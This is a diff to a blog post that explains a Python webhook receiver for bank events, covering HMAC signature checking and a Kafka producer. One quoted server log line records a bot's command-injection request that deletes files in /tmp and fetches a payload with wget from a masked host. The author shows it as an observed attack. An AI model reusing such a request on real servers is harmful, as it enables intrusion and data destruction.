@@ -121,7 +121,7 @@ The code is relatively simple. I chose to write this in python for a few reasons
 2. There are a number of open source application servers for python applications (wsgi and so on).
 3. Python has good support for Kafka.
 4. Python is simple enough and ubiquitous enough for most people to understand.
-4a. Even a hack like me can do it :)
+5. Even a hack like me can do it :)
 
 The repo of my code is here: [Github Repository of code](http://github.com/codecowboydotio/event-driven-banking/)
 
@@ -182,9 +182,6 @@ def processrequest():
   try:
     auth_header = request.headers[app.config['HEADER']]
     expected_user_agent = app.config['USER_AGENT']
-    key = app.config['KEY'].encode("ascii") #ascii encoding returns a byte object 
-    rawdata = request.get_data()
-    data = request.get_json()
 ```
 
 The code gets a header name from my **config.py** file. The header in question is named **X-Up-Authenticity-Signature**. 
@@ -209,6 +206,8 @@ The verification process involves:
 The code to do this is as follows.
 
 ```
+    key = app.config['KEY'].encode("ascii") #ascii encoding returns a byte object 
+    rawdata = request.get_data()
     h = hmac.new(key, rawdata, hashlib.sha256 ) # byte object in should compute the same hash as the header
     computed_hmac = h.hexdigest()
 
@@ -230,5 +229,31 @@ x.x.x.x - - [13/Aug/2020 12:13:07] "GET /shell?cd+/tmp;rm+-rf+*;wget+x.x.x.x/jaw
 This is an attempt by a BOT to gain access to my server.  I will discuss the security implications in a futher post and perhaps ask one or more guest security experts to comment.
 
 ### Kafka Producer
+The Kafka producer is has two main pieces of code. The first has nothing to do with Kafka, but grabs a bunch of attributes (one of which I will publish to a kafka topic).
+
+
+```
+ if auth_header == computed_hmac:
+      eventType = (data['data']['attributes']['eventType'])
+      eventCreated = (data['data']['attributes']['createdAt'])
+      transactionUrl = (data['data']['relationships']['transaction']['links']['related'])
+```      
+
+The actual Kafka producer code is below. The code pulls the Kafka host and topic from the **config.py** file. In the example below, I am publishing the transaction URL (taken from the POST request the bank sends me) to Kafka. I have a Kafka consumer subscribed to the same topic that uses the URL to get the actual transaction details.
+
+```
+      khost = app.config['KHOST']
+      ktopic = app.config['KTOPIC']
+      try:
+        producer = KafkaProducer(
+          value_serializer=lambda v: json.dumps(v).encode('utf-8'),
+          bootstrap_servers=khost)
+        kafka_payload=transactionUrl
+        kafka_topic = ktopic
+        producer.send(kafka_topic, kafka_payload)
+        producer.flush()
+      except Exception as e: 
+	{ exception handling code here }
+```
 
 ### Return data
